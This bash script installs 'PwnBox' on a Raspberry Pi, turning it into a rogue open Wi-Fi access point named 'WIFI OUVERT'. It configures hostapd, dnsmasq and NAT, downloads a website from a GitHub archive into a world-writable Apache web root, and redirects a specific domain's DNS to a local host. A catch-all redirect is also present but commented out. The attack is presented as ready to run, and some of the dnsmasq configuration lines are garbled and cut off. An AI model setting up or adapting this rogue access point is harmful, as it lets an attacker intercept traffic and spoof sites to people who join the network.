#!/bin/bash
########################
# PwnBox installation script
# author : tclauzel
# date : 310519 - v1
########################
echo "CAUTION !!! This script may impact your network configuration and replace it !! 30 second before run"
sleep 30
echo "installing dependencies"
apt install hostapd dnsmasq apache2 php -y
#########################################################
#########################################################
echo "backup full configuration files for dnsmasq, hostapd and other conf file"
mkdir /home/pi/backup
cp /proc/sys/net/ipv4/ip_forward /home/pi/backup/
cp /etc/apache2/apache2.conf  /home/pi/backup/
cp /etc/dhcpcd.conf /home/pi/backup/
cp /etc/dnsmasq.conf /home/pi/backup/
iptables-save > /home/pi/backup/iptables.backup
#########################################################
#########################################################
echo "bypass the dhcpcd.conf ..."
echo "denyinterfaces eth0" >> /etc/dhcpcd.conf
echo "denyinterfaces wlan0" >> /etc/dhcpcd.conf
echo "denyinterfaces wlan1" >> /etc/dhcpcd.conf
#########################################################
#########################################################
echo "now editiing the ip configuration"
echo "
# interfaces(5) file used by ifup(8) and ifdown(8)

# Please note that this file is written to be used with dhcpcd
# For static IP, consult /etc/dhcpcd.conf and 'man dhcpcd.conf'

# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d
############


auto wlan1
auto eth0
allow-hotplug wlan1
iface wlan1 inet static
    address 192.168.50.1
    netmask 255.255.255.0
    network 192.168.50.0
allow-hotplug eth0
iface eth0 inet dhcp
" > /etc/network/interfaces.txt
#########################################################
#########################################################
echo "now configuring dnsmasq"
echo "
interface=wlan1      # Use interface wlan1
listen-address=192.168.50.1 # Explicitly specify the address to listen on
bind-interfaces      # Bind to the interface to make sure we aren't sending thin                                                                                       $
server=8.8.8.8       # Forward DNS requests to Google DNS
domain-needed        # Don't forward short names
bogus-priv           # Never forward addresses in the non-routed address spaces.
dhcp-range=192.168.50.50,192.168.50.150,12h # Assign IP addresses between 192.168.50.5                                                                                 $
listen-address=192.168.50.1 # Explicitly specify the address to listen on
## END
#Redirection traffic
#address=/#/192.168.50.1dhcp-range=192.168.50.50,192.168.50.150,12h # Assign IP addresses between 192.168.50.5                                                                                        0 and 192.168.50.150 with a 12 hour lease time
" >> /etc/dnsmasq.conf
#########################################################
#########################################################
echo "now creating the wifi.conf for hostapd"
touch /home/pi/wifi.conf
echo "
interface=wlan1
driver=nl80211
ssid=WIFI OUVERT
hw_mode=g
channel=0
ieee80211d=1
country_code=FR
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" >> /home/pi/wifi.conf
#########################################################
#########################################################
echo "configuring the NAT"
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
#########################################################
#########################################################
echo "configuring IPTABLES"
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
sudo sh -c "iptables-save > /etc/iptables.ipv4.nat"
echo "up iptables-restore < /etc/iptables.ipv4.nat" >> /etc/network/interfaces
#########################################################
#########################################################
echo "creating RogueAP"
wget https://github.com/Thomas-Clauzel/PwnBox/archive/master.zip
unzip master.zip
rm /var/www/html/index*
cp -r PwnBox-master/website/* /var/www/html
chmod -R 777 /var/www/html
echo "address=/fred.rochesterarmoredcar.com/192.168.1.35" >> /etc/dnsmasq.conf
echo "
<Directory /var/www/html>
        Allow from all
        Options Indexes FollowSymLinks
        AllowOverride all
        Require all granted
</Directory>
" >> /etc/apache2/apache2.conf
